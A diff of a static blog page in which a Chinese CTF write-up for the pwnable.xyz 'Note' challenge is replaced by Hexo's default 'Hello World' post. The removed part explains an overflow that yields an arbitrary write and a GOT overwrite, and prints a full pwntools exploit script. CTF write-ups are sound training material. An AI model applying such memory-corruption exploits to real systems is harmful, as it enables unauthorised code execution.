@@ -3,7 +3,7 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>pwnable.xyz Note WriteUp - 广莫之野</title>
+  <title>Hello World - 广莫之野</title>
   <meta charset="UTF-8">
   <meta name="description" content>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -11,24 +11,17 @@
   
 
   <link rel="shortcut icon" href="/home.png" type="image/png">
-  <meta name="description" content="pwnable.xyz 上的Note的WriteUp。">
-<meta name="keywords" content="ctf,pwn">
+  <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.xyz Note WriteUp">
-<meta property="og:url" content="http://shiroinu.top/2019/09/12/note/index.html">
+<meta property="og:title" content="Hello World">
+<meta property="og:url" content="http://shiroinu.top/2021/05/08/hello-world/index.html">
 <meta property="og:site_name" content="广莫之野">
-<meta property="og:description" content="pwnable.xyz 上的Note的WriteUp。">
+<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://i.loli.net/2019/09/12/DepwVgEmMrjNcnC.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/12/C1gbnhT5GUlcfPj.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/12/ykEMC2G7xQbXTpH.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/12/dQTXpF9oxqCBIz2.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/12/lHm18kxzP2QNUcO.png">
-<meta property="og:updated_time" content="2019-09-12T12:32:34.063Z">
+<meta property="og:updated_time" content="2019-08-07T11:55:34.526Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.xyz Note WriteUp">
-<meta name="twitter:description" content="pwnable.xyz 上的Note的WriteUp。">
-<meta name="twitter:image" content="https://i.loli.net/2019/09/12/DepwVgEmMrjNcnC.png">
+<meta name="twitter:title" content="Hello World">
+<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
@@ -36,7 +29,7 @@
   
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1621172060153">
+  <link rel="stylesheet" href="/css/style.css?v=1621172060431">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -137,51 +130,26 @@
         
             <img src="/images/back1.png">
         
-        <h1>pwnable.xyz Note WriteUp</h1>
+        <h1>Hello World</h1>
     </div>
   <div class="nexmoe-post-meta">
-    <a><i class="nexmoefont icon-calendar-fill"></i>2019年09月12日</a>
-    <a><i class="nexmoefont icon-areachart"></i>238 字</a>
+    <a><i class="nexmoefont icon-calendar-fill"></i>2021年05月08日</a>
+    <a><i class="nexmoefont icon-areachart"></i>75 字</a>
     <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
     
     
-      <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
-    
   </div>
   <article>
-    <p>pwnable.xyz 上的Note的WriteUp。</p>
+    <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
 <a id="more"></a>
-
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/DepwVgEmMrjNcnC.png" alt="MarkDown"></p>
-<p><img src="https://i.loli.net/2019/09/12/C1gbnhT5GUlcfPj.png" alt="MarkDown"></p>
-<p><img src="https://i.loli.net/2019/09/12/ykEMC2G7xQbXTpH.png" alt="MarkDown"></p>
-<p><img src="https://i.loli.net/2019/09/12/dQTXpF9oxqCBIz2.png" alt="MarkDown"></p>
-<p>目标是触发win()函数。注意到，输入1进入的<code>edit_note()</code>函数可对全局变量<code>s</code>进行任意长度写，其中buf和s的距离是0x20，而输入2进入的 <code>edit_desc()</code>函数是从标准输入流写入<code>buf</code>内容所指的地址中，由此可以通过先输入1，将buf中内容覆写，再输入2，达到任意地址写的目的。</p>
-<p>还有一点，因为该程序并未开启RELRO保护，因此可以进行GOT表覆写.</p>
-<p><img src="https://i.loli.net/2019/09/12/lHm18kxzP2QNUcO.png" alt="MarkDown"></p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
-context.log_level = &#39;DEBUG&#39;
-flag = 0x40093c
-elf = ELF(&#39;./challenge&#39;)
-puts_got = elf.got[&#39;puts&#39;]
-print(hex(puts_got))
-#puts_got = 0x601220
-sh = process(&#39;./challenge&#39;)
-#sh = remote(&#39;svc.pwnable.xyz&#39;,30016)
-sh.recvuntil(&#39;&gt; &#39;)
-payload = &#39;A&#39; * 32 + p64(puts_got)
-sh.sendline(&#39;1&#39;)
-sh.recvuntil(&#39;? &#39;)
-sh.sendline(&#39;52&#39;)
-sh.recvuntil(&#39;note: &#39;)
-sh.sendline(payload)
-sh.recvuntil(&#39;&gt; &#39;)
-sh.sendline(&#39;2&#39;)
-sh.recvuntil(&#39;desc: &#39;)
-sh.sendline(p64(flag))
-sh.recvuntil(&#39;&gt; &#39;)
-sh.sendline(&#39;123&#39;)
-sh.interactive()</code></pre>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre>
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre>
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre>
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
 
   </article>
   
@@ -220,7 +188,7 @@ sh.interactive()</code></pre>
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1621172060157"></script>
+<script src="/js/app.js?v=1621172060434"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 
 
